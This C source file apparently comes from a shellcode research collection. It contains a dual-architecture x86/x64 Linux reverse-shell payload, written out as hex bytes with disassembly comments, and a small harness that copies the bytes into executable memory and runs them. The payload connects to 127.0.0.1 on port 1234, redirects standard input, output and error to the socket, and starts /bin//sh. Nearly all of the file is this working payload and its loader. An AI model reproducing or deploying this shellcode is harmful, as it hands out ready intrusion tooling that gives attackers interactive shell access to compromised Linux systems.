
/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <sys/mman.h>

#define RS_SIZE 124

char RS[] = {
  /* 0000 */ "\xb9\xfd\xff\xfb\x2d"         /* mov ecx, 0x2dfbfffd             */
  /* 0005 */ "\xba\x80\xff\xff\xfe"         /* mov edx, 0xfeffff80             */
  /* 000A */ "\xf7\xd1"                     /* not ecx                         */
  /* 000C */ "\xf7\xd2"                     /* not edx                         */
  /* 000E */ "\x50"                         /* push rax                        */
  /* 000F */ "\x50"                         /* push rax                        */
  /* 0010 */ "\x89\x0c\x24"                 /* mov [rsp], ecx                  */
  /* 0013 */ "\x89\x54\x24\x04"             /* mov [rsp+0x4], edx              */
  /* 0017 */ "\x6a\x10"                     /* push 0x10                       */
  /* 0019 */ "\x54"                         /* push rsp                        */
  /* 001A */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 001C */ "\x99"                         /* cdq                             */
  /* 001D */ "\xb0\x67"                     /* mov al, 0x67                    */
  /* 001F */ "\x6a\x01"                     /* push 0x1                        */
  /* 0021 */ "\x5e"                         /* pop rsi                         */
  /* 0022 */ "\x6a\x02"                     /* push 0x2                        */
  /* 0024 */ "\x5f"                         /* pop rdi                         */
  /* 0025 */ "\x48\x75\x15"                 /* jnz 0x3d                        */
  /* 0028 */ "\xb0\x29"                     /* mov al, 0x29                    */
  /* 002A */ "\x0f\x05"                     /* syscall                         */
  /* 002C */ "\x97"                         /* xchg edi, eax                   */
  /* 002D */ "\x96"                         /* xchg esi, eax                   */
  /* 002E */ "\xb0\x21"                     /* mov al, 0x21                    */
  /* 0030 */ "\x0f\x05"                     /* syscall                         */
  /* 0032 */ "\x4e\x79\xf9"                 /* jns 0x2e                        */
  /* 0035 */ "\x5e"                         /* pop rsi                         */
  /* 0036 */ "\x5a"                         /* pop rdx                         */
  /* 0037 */ "\xb0\x2a"                     /* mov al, 0x2a                    */
  /* 0039 */ "\x0f\x05"                     /* syscall                         */
  /* 003B */ "\xeb\x1d"                     /* jmp 0x5a                        */
  /* 003D */ "\x60"                         /* invalid                         */
  /* 003E */ "\x56"                         /* push rsi                        */
  /* 003F */ "\x5b"                         /* pop rbx                         */
  /* 0040 */ "\x52"                         /* push rdx                        */
  /* 0041 */ "\x53"                         /* push rbx                        */
  /* 0042 */ "\x57"                         /* push rdi                        */
  /* 0043 */ "\x54"                         /* push rsp                        */
  /* 0044 */ "\x59"                         /* pop rcx                         */
  /* 0045 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0047 */ "\x93"                         /* xchg ebx, eax                   */
  /* 0048 */ "\x59"                         /* pop rcx                         */
  /* 0049 */ "\xb0\x3f"                     /* mov al, 0x3f                    */
  /* 004B */ "\xcd\x80"                     /* int 0x80                        */
  /* 004D */ "\x49\x79\xf9"                 /* jns 0x49                        */
  /* 0050 */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 0052 */ "\x53"                         /* push rbx                        */
  /* 0053 */ "\x54"                         /* push rsp                        */
  /* 0054 */ "\x59"                         /* pop rcx                         */
  /* 0055 */ "\x6a\x03"                     /* push 0x3                        */
  /* 0057 */ "\x5b"                         /* pop rbx                         */
  /* 0058 */ "\xcd\x80"                     /* int 0x80                        */
  /* 005A */ "\x99"                         /* cdq                             */
  /* 005B */ "\x50"                         /* push rax                        */
  /* 005C */ "\x50"                         /* push rax                        */
  /* 005D */ "\x50"                         /* push rax                        */
  /* 005E */ "\x54"                         /* push rsp                        */
  /* 005F */ "\x5b"                         /* pop rbx                         */
  /* 0060 */ "\x53"                         /* push rbx                        */
  /* 0061 */ "\x5f"                         /* pop rdi                         */
  /* 0062 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 0068 */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 006F */ "\x40\x75\x04"                 /* jnz 0x76                        */
  /* 0072 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 0074 */ "\x0f\x05"                     /* syscall                         */
  /* 0076 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0078 */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 007A */ "\xcd\x80"                     /* int 0x80                        */
};

void xcode(char *s, int len)
{
  void *bin;

  bin=mmap (0, len, 
      PROT_EXEC | PROT_WRITE | PROT_READ, 
      MAP_ANON  | MAP_PRIVATE, -1, 0);  

  memcpy (bin, s, len);
  
  // execute
  ((void(*)())bin)();
    
  munmap (bin, len);  
}

int main(void)
{
  xcode (RS, RS_SIZE);
  return 0;  
}

